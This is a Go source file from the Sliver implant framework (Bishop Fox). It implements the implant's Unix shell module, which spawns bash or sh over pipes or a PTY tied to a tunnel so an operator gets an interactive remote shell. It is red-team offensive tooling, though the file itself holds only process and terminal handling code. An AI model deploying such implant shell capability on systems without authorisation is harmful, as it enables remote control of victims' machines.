//go:build darwin || linux || freebsd || openbsd || dragonfly

package shell

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"context"
	"os"
	"os/exec"
	"sync"
	"syscall"

	"github.com/bishopfox/sliver/implant/sliver/shell/pty"
)

var (
	// Shell constants
	bash = []string{"/bin/bash"}
	sh   = []string{"/bin/sh"}
)

// Start - Start a process
func Start(command string) error {
	cmd := exec.Command(command)
	return cmd.Start()
}

// StartInteractive - Start a shell
func StartInteractive(tunnelID uint64, command []string, enablePty bool, rows, cols uint16) (*Shell, error) {
	if enablePty {
		return ptyShell(tunnelID, command, rows, cols)
	}
	return pipedShell(tunnelID, command)
}

func pipedShell(tunnelID uint64, command []string) (*Shell, error) {
	// {{if .Config.Debug}}
	log.Printf("[shell] %s", command)
	// {{end}}

	ctx, cancel := context.WithCancel(context.Background())

	cmd := exec.CommandContext(ctx, command[0], command[1:]...)
	stdin, err := cmd.StdinPipe()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] stdin pipe failed\n")
		// {{end}}
		cancel()
		return nil, err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] stdout pipe failed\n")
		// {{end}}
		cancel()
		return nil, err
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] stderr pipe failed\n")
		// {{end}}
		cancel()
		return nil, err
	}

	err = cmd.Start()

	return &Shell{
		ID:      tunnelID,
		Command: cmd,
		Stdout:  stdout,
		Stdin:   stdin,
		Stderr:  stderr,
		Cancel:  cancel,
	}, err
}

func ptyShell(tunnelID uint64, command []string, rows, cols uint16) (*Shell, error) {
	// {{if .Config.Debug}}
	log.Printf("[ptmx] %s", command)
	// {{end}}

	ctx, cancel := context.WithCancel(context.Background())

	cmd := exec.CommandContext(ctx, command[0], command[1:]...)
	ptyFile, ttyFile, err := pty.Open()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[term] %v, falling back to piped shell...", err)
		// {{end}}
		cancel()
		return pipedShell(tunnelID, command)
	}

	ttyPath := ttyFile.Name()

	if rows > 0 && cols > 0 {
		sz := &pty.Winsize{Rows: rows, Cols: cols}
		_ = pty.Setsize(ttyFile, sz)
		_ = pty.Setsize(ptyFile, sz)
	}

	cmd.Stdout = ttyFile
	cmd.Stdin = ttyFile
	cmd.Stderr = ttyFile
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
	}
	cmd.SysProcAttr.Setctty = true
	cmd.SysProcAttr.Setsid = true
	err = cmd.Start()
	if err != nil {
		ptyFile.Close()
		ttyFile.Close()
		// {{if .Config.Debug}}
		log.Printf("[term] %v, falling back to piped shell...", err)
		// {{end}}
		cancel()
		return pipedShell(tunnelID, command)
	}

	term := &ptyRWC{
		pty: ptyFile,
		tty: ttyPath,
	}
	_ = ttyFile.Close()

	return &Shell{
		ID:      tunnelID,
		Command: cmd,
		Stdout:  term,
		Stdin:   term,
		Cancel:  cancel,
	}, err
}

type ptyRWC struct {
	pty *os.File
	tty string

	closeOnce sync.Once
}

func (p *ptyRWC) Read(b []byte) (int, error) {
	return p.pty.Read(b)
}

func (p *ptyRWC) Write(b []byte) (int, error) {
	return p.pty.Write(b)
}

func (p *ptyRWC) Close() error {
	var retErr error
	p.closeOnce.Do(func() {
		if p.pty != nil {
			retErr = p.pty.Close()
		}
	})
	return retErr
}

func (p *ptyRWC) Resize(rows, cols uint32) error {
	if rows > 0xffff {
		rows = 0xffff
	}
	if cols > 0xffff {
		cols = 0xffff
	}
	if rows == 0 || cols == 0 {
		return nil
	}

	sz := &pty.Winsize{Rows: uint16(rows), Cols: uint16(cols)}
	errTTY := error(nil)
	if p.tty != "" {
		ttyFile, err := os.OpenFile(p.tty, os.O_RDWR|syscall.O_NOCTTY, 0)
		if err != nil {
			errTTY = err
		} else {
			errTTY = pty.Setsize(ttyFile, sz)
			_ = ttyFile.Close()
		}
	}
	errPTY := error(nil)
	if p.pty != nil {
		errPTY = pty.Setsize(p.pty, sz)
	}
	if errTTY == nil || errPTY == nil {
		return nil
	}
	if errTTY != nil {
		return errTTY
	}
	return errPTY
}

// GetSystemShellPath - Find bash or sh
func GetSystemShellPath(path string) []string {
	if exists(path) {
		return []string{path}
	}
	if exists(bash[0]) {
		return bash
	}
	return sh
}
